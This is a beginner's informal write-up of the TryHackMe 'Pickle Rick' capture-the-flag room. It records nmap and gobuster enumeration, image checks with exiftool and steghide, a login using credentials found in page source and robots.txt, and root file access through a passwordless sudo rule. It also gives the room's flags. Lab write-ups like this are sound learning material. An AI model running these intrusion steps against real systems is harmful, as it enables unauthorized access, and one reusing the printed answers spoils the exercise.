@@ -1,0 +1,216 @@
+picle rickle room THM
+# NMAP
+
+─(㉿kali)-[~]
+└─$ nmap 10.201.0.12 -sV -sC -F     
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 09:57 IST
+Nmap scan report for 10.201.0.12
+Host is up (0.26s latency).
+Not shown: 98 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3c:09:e3:94:e4:20:c2:fa:7c:c2:23:1b:b2:be:f5:31 (RSA)
+|   256 9d:1f:48:d8:5d:82:3e:26:1e:a3:15:f8:ea:2b:b4:1f (ECDSA)
+|_  256 a3:6b:2f:4d:16:23:1a:a1:b7:e4:d0:d7:cf:b5:80:e1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Rick is sup4r cool
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 17.98 seconds
+
+
+# SSH PORT CANT ACCESS NOW BECUASE I DID"T HAVE ANY CREDINALS SO USED HTTP PORT THEN I GOT ONE PAGE WIT HBLA BLA WITH ONE NAME MORTY
+THEN I NSOECT THEN I GET ON USER NAME  R1ckRul3s AND ONE IMG PATH
+
+
+  .jumbotron {
+    background-image: url("assets/rickandmorty.jpeg");
+    background-size: cover;
+    height: 340px;
+  }
+  
+  
+
+    Note to self, remember username!
+
+    Username: R1ckRul3s
+
+  
+# DOWNLOAD THAT IMAGE BECUASE MYABE THERE IS ANY SAGHINOGRAPHY {HIDE THINGS INSIDE IMAGE}
+
+open used 
+──(㉿kali)-[~]
+└─$ open rickandmorty.jpeg
+
+#NEW TOOL exiftool for get metadata about img {when take ,where , img propeties etc }
+
+┌──(㉿kali)-[~]
+└─$ exiftool rickandmorty.jpeg 
+ExifTool Version Number         : 13.25
+File Name                       : rickandmorty.jpeg
+Directory                       : .
+File Size                       : 500 kB
+File Modification Date/Time     : 2019:02:10 22:07:35+05:30
+File Access Date/Time           : 2025:11:10 10:16:42+05:30
+File Inode Change Date/Time     : 2025:11:10 10:14:41+05:30
+File Permissions                : -rw-rw-r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+Image Width                     : 1600
+Image Height                    : 900
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 1600x900
+Megapixels                      : 1.4
+
+#NEW TOOL called binwalk for find any FILES hide in image 
+
+┌──(㉿kali)-[~]
+└─$ binwalk rickandmorty.jpeg
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+# NEW TOOL
+new tool called steghide for add file to image and etract files from img
+
+To embed emb.txt in cvr.jpg: steghide embed -cf cvr.jpg -ef emb.txt
+To extract embedded data from stg.jpg: steghide extract -sf stg.jp
+
+# I DID"T GET ANTHING FROM THIS TOOLS SO I USED GOBUSTER 
+ 
+ GOBUSTER for scan and find any loophole that used we can enter website 
+
+──(㉿kali)-[~]
+└─$ gobuster dir -u http://10.201.0.12  -w /usr/share/wordlists/dirb/common.txt
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.0.12
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 276]
+/.htaccess            (Status: 403) [Size: 276]
+/.htpasswd            (Status: 403) [Size: 276]
+/assets               (Status: 301) [Size: 311] [--> http://10.201.0.12/assets/]
+/index.html           (Status: 200) [Size: 1062]
+/robots.txt           (Status: 200) [Size: 17]
+/server-status        (Status: 403) [Size: 276]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+#THEN I CLICKED  http://10.201.0.12/assets/
+#ALSO I GIT THERE IS A ROBOTS.TXT DIECRTORY THERE INSIDE ROBOTS.TXT I GOT SOME RANDOM TEXT Wubbalubbadubdub I SAVED IT. MAYBE IT IS PASSWORD !!!!
+
+then i get one img links 
+robot.txt file used to store imformation for google bot ads 
+we will some information from there
+like disallwed is sensitive like that
+
+#ALSO TIRED GOBUSTER WITH DIFFERENT FILE 
+
+ gobuster dir -u http://10.201.0.12  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x .txt,.html,.php -t 40
+
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 1062]
+/login.php            (Status: 200) [Size: 882]
+/assets               (Status: 301) [Size: 317] [--> http://10.201.107.244/assets/]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]
+/robots.txt           (Status: 200) [Size: 17]
+
+!!! NOW I GET A NEW HIIDEN DIRECTRY  /login.php 
+
+THEN I GOT LOGIN PAGE AND I USED USERNAME R1ckRul3s , PASS I TIRED PREVIOUS RONDOM TEXT Wubbalubbadubdub 
+
+I LOGINED 
+
+I GOT a command panel
+
+i tryed ls 
+
+--> 
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+then i tryed cat Sup3rS3cretPickl3Ingred.txt --> Command disabled to make it hard for future PICKLEEEE RICCCKKKK 
+ CAT COMMAND DISEBLED HERE SO 
+ I TRYED ALTERNATIVE LIKE 
+less Sup3rS3cretPickl3Ingred.txt --> mr. meeseek hair
+
+OR 
+http://10.201.107.244/Sup3rS3cretPickl3Ingred.txt TRY LIKE THIS 
+
+FIRST INGREDENT 
+
+# CATED CLUE.TXT  cat disebles so i tryed less
+
+less clue.txt --> Look around the file system for the other ingredient.
+
+so i tryed more commands like
+
+ls /home  -> rick , ubantu #users 
+
+SO I TIRED TO LS IN RICK
+
+# ls /home/rick or cd /home/rick && ls  --> second ingredients 
+
+# ls -ahl /home/rick --> total 4
+-rwxrwxrwx 1 root root 13 Feb 10  2019 second ingredients
+
+#cd /home/rick && less second ingredients BUT NOT LOGIN SO {SOMETHING ERROR} 
+  
+  !!!! second ingredients have space btwn file name so how to cat a file its name have spaces !!
+   it is
+ #cd /home/rick && less "second ingredients" --> 1 jerry tear {secong ingredent flag}
+ 
+ # i want switch to root i assume third flag is inside root 
+so tired 
+ # sudo -l --> Matching Defaults entries for www-data on ip-10-201-107-244:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-201-107-244:
+    (ALL) NOPASSWD: ALL 
+
+!!!  SO I CAN RUN ANY COMMAND USED SUDO THERE THEY DIDT ASK PASSWORS 
+
+#sudo ls /root --> 3rd.txt , snap 
+
+#sudo ls /root -lah --> total 36K
+drwx------  4 root root 4.0K Jul 11  2024 .
+drwxr-xr-x 23 root root 4.0K Nov 11 04:18 ..
+-rw-------  1 root root  168 Jul 11  2024 .bash_history
+-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  161 Jan  2  2024 .profile
+drwx------  2 root root 4.0K Feb 10  2019 .ssh
+-rw-------  1 root root  702 Jul 11  2024 .viminfo
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  4 root root 4.0K Jul 11  2024 snap
+
+
+#sudo less /root/3rd.txt -->  3rd ingredients: fleeb juice (third ingredent flag}
+
+!!!!!!!!!!!!!!!!!COMPLETED!!!!!!!!!!!!!
